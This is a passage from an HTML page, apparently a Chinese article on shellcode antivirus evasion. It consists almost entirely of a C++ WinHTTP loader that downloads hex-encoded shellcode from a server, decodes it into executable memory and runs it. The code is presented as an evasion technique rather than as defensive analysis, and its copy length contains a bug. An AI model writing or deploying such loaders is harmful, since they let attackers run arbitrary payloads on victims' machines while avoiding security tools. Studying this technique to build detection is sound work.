YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">这里就把shellcode通过http请求(使用winhttp api)获取赋值到内存缓存数组，动态分配内存执行shellcode:</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang=""><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(150, 152, 150);">#include</span> <span style="color: rgb(24, 54, 145);">"stdafx.h"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(150, 152, 150);">#include</span> <span style="color: rgb(24, 54, 145);">&lt;string&gt;</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(150, 152, 150);">#include</span> <span style="color: rgb(24, 54, 145);">&lt;iostream&gt;</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(150, 152, 150);">#include</span> <span style="color: rgb(24, 54, 145);">&lt;windows.h&gt;</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(150, 152, 150);">#include</span> <span style="color: rgb(24, 54, 145);">&lt;winhttp.h&gt;</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(150, 152, 150);">#pragma</span> comment(lib,<span style="color: rgb(24, 54, 145);">"winhttp.lib"</span>)</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(150, 152, 150);">#pragma</span> comment(lib,<span style="color: rgb(24, 54, 145);">"user32.lib"</span>)</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(167, 29, 93);">using</span> <span style="color: rgb(167, 29, 93);">namespace</span> std;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(167, 29, 93);">void</span> main()</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">{</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    DWORD dwSize = <span style="color: rgb(0, 134, 179);">0</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    DWORD dwDownloaded = <span style="color: rgb(0, 134, 179);">0</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    LPSTR pszOutBuffer = NULL;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    HINTERNET  hSession = NULL,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        hConnect = NULL,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        hRequest = NULL;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    BOOL  bResults = FALSE;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    hSession = <span style="color: rgb(0, 134, 179);">WinHttpOpen</span>(L<span style="color: rgb(24, 54, 145);">"User-Agent"</span>, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, <span style="color: rgb(0, 134, 179);">0</span>);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    <span style="color: rgb(167, 29, 93);">if</span> (hSession)</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    {</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        hConnect = <span style="color: rgb(0, 134, 179);">WinHttpConnect</span>(hSession, L<span style="color: rgb(24, 54, 145);">"127.0.0.1"</span>, INTERNET_DEFAULT_HTTP_PORT, <span style="color: rgb(0, 134, 179);">0</span>);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    }</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    <span style="color: rgb(167, 29, 93);">if</span> (hConnect)</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    {</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        hRequest = <span style="color: rgb(0, 134, 179);">WinHttpOpenRequest</span>(hConnect, L<span style="color: rgb(24, 54, 145);">"POST"</span>, L<span style="color: rgb(24, 54, 145);">"qing.txt"</span>, L<span style="color: rgb(24, 54, 145);">"HTTP/1.1"</span>, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, <span style="color: rgb(0, 134, 179);">0</span>);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    }</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    LPCWSTR header = L<span style="color: rgb(24, 54, 145);">"Content-type: application/x-www-form-urlencoded/r/n"</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    SIZE_T len = lstrlenW(header);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    <span style="color: rgb(0, 134, 179);">WinHttpAddRequestHeaders</span>(hRequest, header, DWORD(len), WINHTTP_ADDREQ_FLAG_ADD);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    <span style="color: rgb(167, 29, 93);">if</span> (hRequest)</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    {</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        std::<span style="color: rgb(167, 29, 93);">string</span> data = <span style="color: rgb(24, 54, 145);">"name=host&amp;sign=xx11sad"</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(167, 29, 93);">const</span> <span style="color: rgb(167, 29, 93);">void</span> *ss = (<span style="color: rgb(167, 29, 93);">const</span> <span style="color: rgb(167, 29, 93);">char</span> *)data.c_str();</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        bResults = <span style="color: rgb(0, 134, 179);">WinHttpSendRequest</span>(hRequest, <span style="color: rgb(0, 134, 179);">0</span>, <span style="color: rgb(0, 134, 179);">0</span>, <span style="color: rgb(167, 29, 93);">const_cast</span>&lt;<span style="color: rgb(167, 29, 93);">void</span> *&gt;(ss), data.length(), data.length(), <span style="color: rgb(0, 134, 179);">0</span>);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(150, 152, 150);">////bResults=WinHttpSendRequest(hRequest,WINHTTP_NO_ADDITIONAL_HEADERS, 0,WINHTTP_NO_REQUEST_DATA, 0, 0, 0 );</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    }</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    <span style="color: rgb(167, 29, 93);">if</span> (bResults)</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    {</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        bResults = <span style="color: rgb(0, 134, 179);">WinHttpReceiveResponse</span>(hRequest, NULL);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    }</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    <span style="color: rgb(167, 29, 93);">if</span> (bResults)</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    {</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(167, 29, 93);">do</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        {</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(150, 152, 150);">// Check for available data.</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            dwSize = <span style="color: rgb(0, 134, 179);">0</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(167, 29, 93);">if</span> (!<span style="color: rgb(0, 134, 179);">WinHttpQueryDataAvailable</span>(hRequest, &amp;dwSize))</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            {</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                printf(<span style="color: rgb(24, 54, 145);">"Error %u in WinHttpQueryDataAvailable.\n"</span>, <span style="color: rgb(0, 134, 179);">GetLastError</span>());</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                <span style="color: rgb(167, 29, 93);">break</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            }</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(167, 29, 93);">if</span> (!dwSize)</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                <span style="color: rgb(167, 29, 93);">break</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            pszOutBuffer = <span style="color: rgb(167, 29, 93);">new</span> <span style="color: rgb(167, 29, 93);">char</span>[dwSize + <span style="color: rgb(0, 134, 179);">1</span>];</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(167, 29, 93);">if</span> (!pszOutBuffer)</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            {</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                printf(<span style="color: rgb(24, 54, 145);">"Out of memory\n"</span>);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                <span style="color: rgb(167, 29, 93);">break</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            }</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(0, 134, 179);">ZeroMemory</span>(pszOutBuffer, dwSize + <span style="color: rgb(0, 134, 179);">1</span>);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(167, 29, 93);">if</span> (!<span style="color: rgb(0, 134, 179);">WinHttpReadData</span>(hRequest, (LPVOID)pszOutBuffer, dwSize, &amp;dwDownloaded))</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            {</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                printf(<span style="color: rgb(24, 54, 145);">"Error %u in WinHttpReadData.\n"</span>, <span style="color: rgb(0, 134, 179);">GetLastError</span>());</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            }</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(167, 29, 93);">else</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            {</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                printf(<span style="color: rgb(24, 54, 145);">"ok"</span>);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            }</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(150, 152, 150);">//char ShellCode[1024];</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(167, 29, 93);">int</span> code_length = strlen(pszOutBuffer);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(167, 29, 93);">char</span>* <span style="color: rgb(0, 134, 179);">ShellCode</span> = (<span style="color: rgb(167, 29, 93);">char</span>*)calloc(code_length  /<span style="color: rgb(0, 134, 179);">2</span> , <span style="color: rgb(167, 29, 93);">sizeof</span>(<span style="color: rgb(167, 29, 93);">unsigned</span> <span style="color: rgb(167, 29, 93);">char</span>));</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(167, 29, 93);">for</span> (<span style="color: rgb(0, 134, 179);">size_t</span> count = <span style="color: rgb(0, 134, 179);">0</span>; count &lt; code_length / <span style="color: rgb(0, 134, 179);">2</span>; count++){</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                sscanf(pszOutBuffer, <span style="color: rgb(24, 54, 145);">"%2hhx"</span>, &amp;<span style="color: rgb(0, 134, 179);">ShellCode</span>[count]);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                pszOutBuffer += <span style="color: rgb(0, 134, 179);">2</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            }</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            printf(<span style="color: rgb(24, 54, 145);">"%s"</span>, <span style="color: rgb(0, 134, 179);">ShellCode</span>);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(150, 152, 150);">//strcpy(ShellCode,pszOutBuffer);</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(167, 29, 93);">void</span> *<span style="color: rgb(167, 29, 93);">exec</span> = <span style="color: rgb(0, 134, 179);">VirtualAlloc</span>(<span style="color: rgb(0, 134, 179);">0</span>, <span style="color: rgb(167, 29, 93);">sizeof</span> <span style="color: rgb(0, 134, 179);">ShellCode</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            memcpy(<span style="color: rgb(167, 29, 93);">exec</span>, <span style="color: rgb(0, 134, 179);">ShellCode</span>, <span style="color: rgb(167, 29, 93);">sizeof</span> <span style="color: rgb(0, 134, 179);">ShellCode</span>);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            ((<span style="color: rgb(167, 29, 93);">void</span>(*)())<span style="color: rgb(167, 29, 93);">exec</span>)();</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(167, 29, 93);">delete</span>[] pszOutBuffer;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(167, 29, 93);">if</span> (!dwDownloaded)</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                <span style="color: rgb(167, 29, 93);">break</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        } <span style="color: rgb(167, 29, 93);">while</span> (dwSize &gt; <span style="color: rgb(0, 134, 179);">0</span>);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    }</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    <span style="color: rgb(167, 29, 93);">if</span> (hRequest) <span style="color: rgb(0, 134, 179);">WinHttpCloseHandle</span>(hRequest);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    <span style="color: rgb(167, 29, 93);">if</span> (hConnect) <span style="color: rgb(0, 134, 179);">WinHttpCloseHandle</span>(hConnect);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    <span style="color: rgb(167, 29, 93);">if</span> (hSession) <span style="color: rgb(0, 134, 179);">WinHttpCloseHandle</span>(hSession);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    system(<span style="color: rgb(24, 54, 145);">"pause"</span>);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">}</span></code></pre></section><figure style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-backh="177" data-backw="319" data-ratio="0.5543097407147862" src="图片/HACK学习呀_2020-02-08_干货Shellcode免杀总结一/4_XYNERbQCzoHVJOus0Dudg4uhicdeDg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9aRERicd8n2Qkte4cYIIibAkozKXtg9WW98N0ickibslJgp1kLxXYNERbQCzoHVJOus0Dudg4uhicdeDg/640?wx_fmt=png'" data-type="png" data-w="1427" style="margin: 0.1em auto 0.5em;line-height: 1.75;border-radius: 4px;display: block;width: 100%;height: auto;" title="null"  /></figure><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft 